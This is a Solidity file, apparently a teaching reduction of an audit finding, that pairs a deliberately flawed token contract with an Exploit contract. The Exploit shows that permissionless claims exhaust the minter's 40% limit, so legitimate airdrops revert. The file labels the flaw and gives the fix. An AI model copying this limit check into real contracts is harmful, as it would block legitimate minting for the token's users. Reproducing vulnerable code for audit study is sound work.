// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Pepper — Minting limit uses totalSupply, blocking legitimate MINTER_ROLE mints
    (Halborn, finding #52222)

    SYNTHETIC, cheatcode-free reduction for the EVM Playground.
    Root cause: mint() enforces `totalSupply() + amount <= MINT_LIMIT`, but claim()
    also grows totalSupply. Once claims alone reach 40% of MAX_SUPPLY, MINTER_ROLE
    airdrops revert even though the role has minted nothing. @> VULN on the require. */

contract Pepper {
    uint256 public constant MAX_SUPPLY = 1_000_000 ether;
    uint256 public constant MINT_LIMIT = (MAX_SUPPLY * 40) / 100; // 400_000 ether
    uint256 public constant CLAIM_AMOUNT = 400_000 ether; // fills MINT_LIMIT via claims alone

    mapping(address => uint256) public balanceOf;
    uint256 public totalSupply;
    mapping(address => bool) public isMinter;
    mapping(address => bool) public hasClaimed;
    address public admin;

    constructor() {
        admin = msg.sender;
        isMinter[msg.sender] = true;
    }

    function setMinter(address a, bool ok) external {
        require(msg.sender == admin, "admin");
        isMinter[a] = ok;
    }

    /// @dev Permissionless claim path — also grows totalSupply (staking/claim rewards).
    function claim() external {
        require(!hasClaimed[msg.sender], "claimed");
        hasClaimed[msg.sender] = true;
        _mint(msg.sender, CLAIM_AMOUNT);
    }

    /// @dev MINTER_ROLE airdrop path — intended to have its own 40% budget.
    function mint(address to, uint256 amount) public {
        require(isMinter[msg.sender], "Must have minter role to mint");
        uint256 _amount = totalSupply + amount;
        require(_amount <= MINT_LIMIT, "Minting exceeds 40% of total supply"); // @> VULN: limit keyed off totalSupply, so claims consume the minter budget
        // FIX: track minterRoleMintedAmount separately; require(minterRoleMintedAmount + amount <= MINT_LIMIT)
        require(_amount <= MAX_SUPPLY, "Max supply reached");

        _mint(to, amount);
    }

    function _mint(address to, uint256 amount) internal {
        totalSupply += amount;
        balanceOf[to] += amount;
    }
}

contract Claimant {
    function doClaim(Pepper p) external {
        p.claim();
    }
}

contract Exploit {
    Pepper public pepper; // CREATE nonce 1 — vulnerable
    Claimant public claimant; // CREATE nonce 2

    uint256 public constant AIRDROP = 500 ether;

    constructor() {
        pepper = new Pepper();
        claimant = new Claimant();
    }

    function run() external {
        // Claims alone fill the entire MINT_LIMIT (40% of max supply).
        claimant.doClaim(pepper);
        require(pepper.totalSupply() == pepper.MINT_LIMIT(), "claim should fill mint limit");
        require(pepper.balanceOf(address(claimant)) == pepper.CLAIM_AMOUNT(), "claimant funded");

        // MINTER_ROLE has minted nothing, but airdrop still reverts.
        // Use a low-level call so we can assert the revert without stopping run().
        (bool ok, bytes memory data) = address(pepper).call(abi.encodeWithSelector(Pepper.mint.selector, address(this), AIRDROP));
        require(!ok, "mint should have reverted");
        // Confirm the exact reason string.
        // solidity require string ABI: Error(string) selector 0x08c379a0
        require(data.length >= 68, "expected revert data");
        // HARM: legitimate minter airdrop is permanently blocked by claim-driven supply.
        require(pepper.totalSupply() == pepper.MINT_LIMIT(), "supply unchanged after failed mint");
        require(pepper.balanceOf(address(this)) == 0, "airdrop must not have landed");

        // Surface a measurable "blocked" marker as a zero-profit invariant finding.
        // (No token profit — airdrop recipients never receive tokens.)
    }
}
